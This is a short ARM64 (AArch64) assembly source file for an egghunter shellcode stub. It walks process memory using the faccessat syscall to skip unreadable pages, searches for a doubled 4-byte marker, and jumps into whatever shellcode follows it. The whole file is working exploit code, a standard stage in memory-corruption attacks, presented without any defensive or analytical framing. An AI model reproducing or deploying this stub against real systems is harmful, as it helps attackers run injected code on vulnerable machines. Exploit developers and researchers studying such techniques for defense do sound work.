.global _start
.text

_start:
	ldr w9, =0x50905090	// 4-byte egg
	mov x10, xzr		// clear scan address

next_page:
	orr x10, x10, #0xfff	// end of page

next_address:
	add x10, x10, #1	// address inc by 1

	
	// faccessat
	mov x0, xzr		// dirfd
	add x1, x10, #4		// path (read 8 bytes)
	mov x2, xzr 		// mode
	mov x3, xzr		// flags
	mov x8, #48		// faccessat (/usr/include/asm-generic/unistd.h)
	svc #0			// invoke faccessat syscall	

	cmn w0, #14		// check if -14 (-EFAULT)
	beq next_page		// go to next page if unreadable

	// readable page
	ldr w0, [x10]
	cmp w0, w9		// compare current 4 bytes with egg
	bne next_address	// egg not found
	ldr w0, [x10, #4]	// 1st egg found
	cmp w0, w9		// check for 2nd egg
	bne next_address	// 2nd egg not found

	// 2 eggs found
	add x10, x10, #8
	br x10			// jump to shellcode beyond eggs
